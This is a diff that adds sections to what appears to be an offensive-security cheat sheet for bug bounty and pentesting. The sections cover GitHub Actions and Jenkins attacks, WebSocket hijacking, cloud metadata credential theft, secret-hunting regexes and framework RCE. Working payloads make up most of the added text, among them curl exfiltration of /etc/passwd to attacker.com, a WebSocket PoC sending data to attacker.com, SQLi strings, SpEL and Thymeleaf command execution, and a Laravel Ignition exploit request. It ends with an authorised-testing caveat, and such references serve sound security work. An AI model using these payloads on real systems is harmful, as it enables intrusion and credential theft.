@@ -233,6 +233,432 @@ For agents, model chains as primitive graphs where each node's output is the nex
 
 **Proxies/platforms:** Burp Suite (Repeater group-send for races, Turbo Intruder, HTTP Request Smuggler, Param Miner, InQL, nginx-alias-traversal extensions), Caido, mitmproxy.
 
+---
+
+## SECTION 15: CI/CD PIPELINE ATTACKS
+
+### GitHub Actions Vulnerabilities
+
+**Critical: `pull_request_target` + Checkout**
+```yaml
+# VULNERABLE: triggers in context of TARGET repo (has secrets access)
+# but checks out ATTACKER's PR code
+on: pull_request_target
+jobs:
+  build:
+    steps:
+      - uses: actions/checkout@v3  # checks out PR branch = attacker code
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - run: npm install && npm test  # runs attacker's package.json scripts
+```
+- Find: Search GitHub for `pull_request_target` + `actions/checkout` + `head.sha`
+- Impact: Attacker executes arbitrary code with access to `secrets.*`
+
+**Expression Injection**
+```yaml
+# VULNERABLE: user-controlled value interpolated into shell
+- run: echo "PR title: ${{ github.event.pull_request.title }}"
+# Attack: title = "; curl attacker.com/?d=$(cat /etc/passwd)"
+# Fix: use env var, never interpolate directly into run:
+- run: echo "PR title: $TITLE"
+  env:
+    TITLE: ${{ github.event.pull_request.title }}
+```
+
+**Artifact Poisoning**
+```
+Workflow A (triggered by PR) → uploads build artifact
+Workflow B (triggered by push to main, has secrets) → downloads artifact
+Attack: Workflow A includes malicious script → Workflow B executes it
+Grep: workflows that use upload-artifact/download-artifact across permission boundaries
+```
+
+**Self-Hosted Runners**
+```bash
+# Self-hosted runners persist state between jobs
+# Attack: poison shared runner environment
+# - Write to ~/.bashrc or runner hooks
+# - Drop a malicious binary in PATH
+# - Read secrets left by previous runs
+# Find: repos where self-hosted runners are used for public PRs
+grep -rn "runs-on: self-hosted" .github/workflows/
+```
+
+### GitLab CI Vulnerabilities
+```yaml
+# Shared runners with docker.sock → container escape
+# Unprotected CI variables exposed to fork pipelines
+# variables:
+#   DB_PASSWORD: $CI_SECRET  # exposed in fork pipeline logs
+
+# Fork pipeline trigger: protected vs unprotected jobs
+# Protected: only runs on protected branches
+# Unprotected: runs on fork branches = fork can read CI vars
+```
+
+### Jenkins
+```
+Groovy Script Console (usually at /script) → RCE if accessible
+def cmd = "id".execute(); println cmd.text
+
+Credential exposure:
+- credentials.xml: encrypted credentials
+- /credentials/store/system/domain/_/ — list all credentials
+- Enumerate via: /api/json?tree=jobs[name,url]
+
+Build log leakage: secrets in env vars logged to console output
+```
+
+---
+
+## SECTION 16: WEBSOCKET SECURITY
+
+### WebSocket Vulnerabilities
+```javascript
+// Cross-Site WebSocket Hijacking (CSWSH)
+// No CSRF token on WebSocket handshake
+// PoC HTML:
+<script>
+  var ws = new WebSocket('wss://target.com/chat');
+  ws.onopen = function() {
+    ws.send(JSON.stringify({type: "getHistory"}));
+  };
+  ws.onmessage = function(msg) {
+    fetch('https://attacker.com/?d=' + btoa(msg.data));
+  };
+</script>
+// Works if: cookies sent on handshake (SameSite=None or old Chrome behavior)
+// + no Origin check server-side
+```
+
+**IDOR via WebSocket**
+```javascript
+// Change room_id or user_id in WebSocket message
+ws.send(JSON.stringify({action: "getMessages", room_id: "victim_room_id"}));
+```
+
+**XSS via WebSocket Message**
+```javascript
+// Server reflects message content without encoding
+ws.send("<img src=x onerror=alert(1)>");
+// If server echoes to all clients without sanitization → stored XSS
+```
+
+**SQLi via WebSocket**
+```javascript
+ws.send(JSON.stringify({search: "' OR '1'='1"}));
+ws.send(JSON.stringify({search: "' UNION SELECT username,password FROM users--"}));
+```
+
+**Privilege Escalation via WebSocket**
+```javascript
+// Change role in message
+ws.send(JSON.stringify({action: "changeRole", user_id: 1337, role: "admin"}));
+```
+
+**Testing Checklist:**
+```
+□ Intercept WebSocket handshake in Burp — check Origin header
+□ Send messages as different user — test IDOR
+□ Inject HTML/JS in message content — XSS
+□ SQLi/NoSQLi in search/filter params
+□ No authentication on WebSocket connect itself?
+□ CSWSH: can external origin initiate connection?
+```
+
+---
+
+## SECTION 17: CLOUD MISCONFIGURATION
+
+### AWS
+
+**S3 Bucket Enumeration + Write**
+```bash
+# Enumerate buckets for target
+aws s3 ls s3://target-company-bucket --no-sign-request
+aws s3 cp test.txt s3://target-company-bucket/test.txt --no-sign-request
+# Writable → stored XSS, phishing, or sensitive data access
+
+# Check bucket policy
+aws s3api get-bucket-acl --bucket target-bucket --no-sign-request
+aws s3api get-bucket-policy --bucket target-bucket --no-sign-request
+```
+
+**Cognito Misconfiguration**
+```bash
+# Self-registration enabled on internal Cognito pool
+aws cognito-idp sign-up \
+  --client-id <client_id> \
+  --username attacker@evil.com \
+  --password Passw0rd!
+
+# Cognito gives JWT → access API as "authenticated user"
+# Privilege escalation: check if user can assign themselves to groups
+aws cognito-idp admin-add-user-to-group \
+  --user-pool-id <pool_id> \
+  --username attacker@evil.com \
+  --group-name admin
+```
+
+**Lambda URL Unauthenticated**
+```bash
+# Lambda function URLs with AuthType NONE = public
+curl https://<id>.lambda-url.<region>.on.aws/
+# Check: does URL expose internal functionality?
+```
+
+**IMDSv1 from SSRF**
+```
+SSRF target: http://169.254.169.254/latest/meta-data/
+Credentials: http://169.254.169.254/latest/meta-data/iam/security-credentials/
+Full exfil:
+  → /latest/meta-data/iam/security-credentials/<role-name>
+  → Returns: AccessKeyId, SecretAccessKey, Token
+
+IMDSv2 bypass attempts:
+  curl -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
+    -XPUT http://169.254.169.254/latest/api/token
+  Then: curl -H "X-aws-ec2-metadata-token: <token>" \
+    http://169.254.169.254/latest/meta-data/
+  (Works only from EC2 instance; SSRF usually can't do 2-step)
+```
+
+### GCP
+
+**Open Cloud Storage Buckets**
+```bash
+gsutil ls gs://target-bucket
+curl https://storage.googleapis.com/target-bucket/
+# Public bucket → list/read all objects
+```
+
+**Firebase Open Database**
+```bash
+# Firebase Realtime Database: append .json to URL
+curl https://target.firebaseio.com/.json
+curl https://target.firebaseio.com/users.json
+# Writable without auth → data injection, stored XSS
+
+# Firebase rules misconfiguration:
+# ".read": true or ".write": true = public
+```
+
+**GCP Metadata Service**
+```bash
+# From SSRF on GCP instance:
+curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
+curl -H "Metadata-Flavor: Google" \
+  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+```
+
+### Azure
+
+**Blob Storage Enumeration**
+```bash
+# Public blobs
+curl https://<account>.blob.core.windows.net/<container>?restype=container&comp=list
+# Lists all blobs in public container
+```
+
+**Azure AD User Enumeration**
+```bash
+# GetCredentialType endpoint — no auth required, confirms if email is registered
+curl -s -X POST "https://login.microsoftonline.com/common/GetCredentialType" \
+  -H "Content-Type: application/json" \
+  -d '{"username":"target@company.com"}'
+# "IfExistsResult": 1 = user exists, 0 = doesn't exist
+```
+
+**Azure Metadata Service (SSRF)**
+```
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+  → Header required: Metadata: true
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-08-01&resource=https://management.azure.com/
+  → Returns: access_token (if managed identity configured)
+```
+
+---
+
+## SECTION 18: SECRET DETECTION PATTERNS
+
+### Regex Patterns for Secrets
+```bash
+# AWS Access Key
+grep -rE "AKIA[0-9A-Z]{16}" .
+
+# AWS Secret Access Key
+grep -rE "(?i)aws.*secret.{0,30}[A-Za-z0-9/+]{40}" .
+
+# Google API Key
+grep -rE "AIza[0-9A-Za-z\\-_]{35}" .
+
+# GitHub Personal Access Token
+grep -rE "ghp_[A-Za-z0-9]{36}" .
+grep -rE "github_pat_[A-Za-z0-9_]{82}" .
+
+# GitHub OAuth / Classic
+grep -rE "(gho|ghu|ghs|ghr)_[A-Za-z0-9]{36}" .
+
+# Stripe Secret Key (live)
+grep -rE "sk_live_[A-Za-z0-9]{24,}" .
+
+# Stripe Publishable Key
+grep -rE "pk_live_[A-Za-z0-9]{24,}" .
+
+# Slack Token
+grep -rE "xox[baprs]-[0-9]{12}-[0-9]{12}-[a-zA-Z0-9]{24}" .
+grep -rE "xoxb-[0-9]+-[0-9]+-[a-zA-Z0-9]+" .
+
+# SendGrid API Key
+grep -rE "SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}" .
+
+# JWT
+grep -rE "eyJ[A-Za-z0-9_-]{20,}\.eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]+" .
+
+# PEM Private Key
+grep -rE "-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----" .
+
+# Generic key=value
+grep -rE "(api_key|apikey|api-key|secret|password|passwd|token|bearer|credential)['\"]?\s*[:=]\s*['\"][^'\"]{8,}" .
+```
+
+### Secret Scanning Commands
+```bash
+# trufflehog — git history + entropy
+trufflehog git file:///path/to/repo
+trufflehog github --repo https://github.com/target/repo
+
+# gitleaks
+gitleaks detect --source . --report-format json
+
+# grep in JS files
+grep -rn "api_key\|apiKey\|api-key\|secret\|token\|password" --include="*.js" . | grep -v "node_modules\|test\|spec"
+
+# In decompiled APK / IPA
+grep -rn "AKIA\|sk_live\|ghp_\|AIza" .
+strings * | grep -E "(api|key|token|secret|password)" | grep -v "null\|empty\|placeholder"
+```
+
+### Cryptographic Material Detection
+```bash
+grep -rE "-----BEGIN.*PRIVATE KEY-----" .
+grep -rE "-----BEGIN CERTIFICATE-----" .
+# PGP
+grep -rE "-----BEGIN PGP" .
+```
+
+### PII Patterns
+```bash
+# US Credit Card (Visa)
+grep -rE "\b4[0-9]{12}(?:[0-9]{3})?\b" .
+# US SSN
+grep -rE "\b\d{3}-\d{2}-\d{4}\b" .
+# Email
+grep -rE "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b" .
+```
+
+---
+
+## SECTION 19: FRAMEWORK-SPECIFIC QUICK-HIT ATTACKS
+
+### Next.js
+```bash
+# Server Actions CSRF (Next.js 13.4+)
+# Server Actions bypass standard CSRF protections
+# Test: call _action endpoint directly with cross-origin request
+
+# _next/image SSRF (open redirect / SSRF via image optimizer)
+/_next/image?url=http://attacker.com/x&w=1&q=1
+/_next/image?url=http://169.254.169.254/latest/meta-data/&w=1&q=1
+
+# Middleware bypass (middleware.ts doesn't run on _next/static)
+/_next/static/../api/admin  # may bypass middleware checks
+
+# __NEXT_DATA__ information disclosure
+curl https://target.com/ | grep -o '__NEXT_DATA__.*</script>' | python3 -c "import json,sys; d=sys.stdin.read(); print(json.dumps(json.loads(d[d.find('{'): d.rfind('}')+1]), indent=2))"
+# May contain API keys, session tokens, internal URLs in props
+
+# Rewrites-based SSRF (next.config.js rewrites)
+# If /api/proxy/:path rewrites to backend, try path traversal
+/api/proxy/../../internal/admin
+```
+
+### Laravel
+```bash
+# CVE-2021-3129: Ignition RCE (Laravel < 8.4.2)
+# Debug mode + vendor/facade/ignition exposed
+POST /_ignition/execute-solution
+{"solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
+ "parameters": {"variableName": "...", "viewFile": "php://filter/..."}}
+
+# Exposed management dashboards
+/horizon        # Queue monitoring
+/telescope      # Request/query/job logging (leaks all request data)
+/nova           # Admin panel
+/pulse          # App health metrics
+
+# APP_KEY leak → forge cookies/sessions
+grep -rn "APP_KEY" .env storage/logs/
+
+# Mass assignment
+# Any Eloquent model without $fillable or with $guarded = []
+grep -rn "\$guarded\s*=\s*\[\]" app/Models/
+```
+
+### Spring Boot
+```bash
+# Actuator endpoints (Spring Boot < 2.0 without security config)
+/actuator/env          # environment variables (secrets!)
+/actuator/heapdump     # JVM heap dump (extract secrets with jmap)
+/actuator/mappings     # all URL routes
+/actuator/jolokia      # JMX operations (RCE via logback)
+/actuator/loggers      # change log levels (verbose logging leaks)
+
+# SpEL injection (Spring Expression Language)
+# In @Value, @PreAuthorize, Thymeleaf templates
+${T(java.lang.Runtime).getRuntime().exec("id")}
+#{T(java.lang.Runtime).getRuntime().exec("id")}
+
+# Thymeleaf SSTI
+__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x
+```
+
+### Django
+```bash
+# Debug toolbar (/djdt/sql/ shows all queries with params)
+curl https://target.com/djdt/sql/
+
+# SECRET_KEY in settings → forge CSRF tokens and session cookies
+grep -rn "SECRET_KEY" .
+
+# ORM __ lookup injection
+# If user input passed to filter():
+?username=admin__password__startswith=a  # time-based extraction
+
+# Admin panel enumeration
+/admin/  # Django admin — try default creds
+/admin/auth/user/  # list all users if logged in
+```
+
+### Ruby on Rails
+```bash
+# YAML deserialization RCE (Ruby < 3.1)
+# Marshal.load / YAML.load with user input
+# Gadget chains: activesupport-7.0.6 (CodeGadget, AnyObject)
+
+# Mass assignment
+# attr_accessible removed in Rails 4+ but legacy apps may use it
+grep -rn "params\.permit\|params\[:user\]\|update_attributes" app/
+
+# SECRET_KEY_BASE in environment
+grep -rn "SECRET_KEY_BASE" config/
+
+# send_file path traversal
+# If controller does: send_file params[:file]
+# Try: ?file=../../../etc/passwd
+```
+
 ## Caveats
 - **Authorized testing only.** Every technique here is for use strictly within an in-scope, authorized bug bounty or pentest engagement. Many payloads (webshell upload, `xp_cmdshell`, `$where` busy-loops) can damage or DoS a target; prefer non-destructive proofs (`id`, `sleep`, arithmetic, OOB callback) and never run `rm`/`shutdown`/destructive SQL.
 - **Source quality varies.** Canonical mechanics (PortSwigger Web Security Academy, OWASP, PayloadsAllTheThings, HackTricks, tool README/docs) are high-confidence. Some payloads and "works in 2026" claims come from individual Medium/DEV/substack write-ups and vendor blogs; treat specific bounty dollar amounts, WAF-version-specific bypasses, and star counts as point-in-time and verify before relying on them.
